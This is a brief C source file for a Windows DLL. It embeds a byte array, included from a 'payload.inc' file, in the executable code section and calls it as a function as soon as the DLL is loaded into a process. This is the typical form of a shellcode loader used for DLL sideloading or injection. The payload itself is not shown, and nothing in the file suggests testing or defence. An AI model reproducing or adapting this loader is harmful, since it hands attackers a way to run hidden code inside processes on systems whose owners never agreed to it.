#include <windows.h>
__attribute__((section(".text"))) unsigned char pDllMain[] = {
#include "payload.inc"
};

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r){
    (void)h; 
    (void)r;

    if (reason == DLL_PROCESS_ATTACH) { 
        ((void(*)())pDllMain)(); 
    }

    return TRUE;
}
